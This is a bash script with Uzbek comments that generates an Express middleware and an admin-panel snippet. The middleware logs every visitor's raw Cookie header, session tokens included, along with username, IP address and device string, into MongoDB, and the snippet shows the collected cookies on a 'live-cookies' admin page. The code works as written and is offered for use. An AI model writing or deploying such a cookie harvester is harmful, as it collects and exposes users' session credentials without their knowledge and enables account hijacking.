#!/bin/bash

echo "⏳ Cookie tracking uchun avtomatik middleware yaratilmoqda..."
mkdir -p middlewares

cat << 'JS' > middlewares/cookieTracker.js
const mongoose = require('mongoose');

// Mongoose qat'iy rejimini (strict mode) aylanib o'tish uchun modelni erkin formatda chaqiramiz
const LiveCookie = mongoose.models.LiveCookie || mongoose.model('LiveCookie', new mongoose.Schema({
    foydalanuvchi: String,
    team: String,
    cookie: String,
    ip: String,
    qurilma: String,
    vaqt: { type: Date, default: Date.now }
}, { strict: false }));

module.exports = async (req, res, next) => {
    try {
        if (req.headers.cookie) {
            // Agar req.user bo'lmasa, "Anonim" deb olamiz
            const username = req.user ? req.user.username : 'Anonim';
            const team = (req.user && req.user.team) ? req.user.team : '—';
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Noma`lum IP';
            // Qurilma ma'lumotini user-agent orqali olamiz
            const device = req.headers['user-agent'] || 'Noma`lum qurilma';
            
            await LiveCookie.findOneAndUpdate(
                { ip: ip, qurilma: device },
                { 
                    foydalanuvchi: username,
                    team: team,
                    cookie: req.headers.cookie,
                    qurilma: device,
                    vaqt: new Date()
                },
                { upsert: true, new: true }
            );
        }
    } catch (err) {
        console.error("Cookie Tracker Xatosi:", err);
    }
    next();
};
JS

echo "✅ middlewares/cookieTracker.js muvaffaqiyatli yaratildi!"
echo "========================================================="
echo "DIQQAT: Tizim to'liq ishlashi uchun quyidagi 2 ta qadamni bajaring:"
echo ""
echo "1) app.js faylingizni oching va ro'yxatdan o'tish (app.use) qatorlariga shuni qo'shing:"
echo "   const cookieTracker = require('./middlewares/cookieTracker');"
echo "   app.use(cookieTracker);"
echo ""
echo "2) Admin panelingizdagi EJS faylini ochib (views/admin/live-cookies.ejs), cookie"
echo "   va qurilma chiqadigan joydagi <td> kodlarini quyidagiga almashtiring:"
echo ""
echo "   <td style=\"max-width: 400px; word-break: break-all; white-space: normal;\">"
echo "       <%= cookie.cookie %>"
echo "   </td>"
echo "   <td style=\"max-width: 250px; word-break: break-word; font-size: 0.85em;\">"
echo "       <%= cookie.qurilma %>"
echo "   </td>"
echo "========================================================="
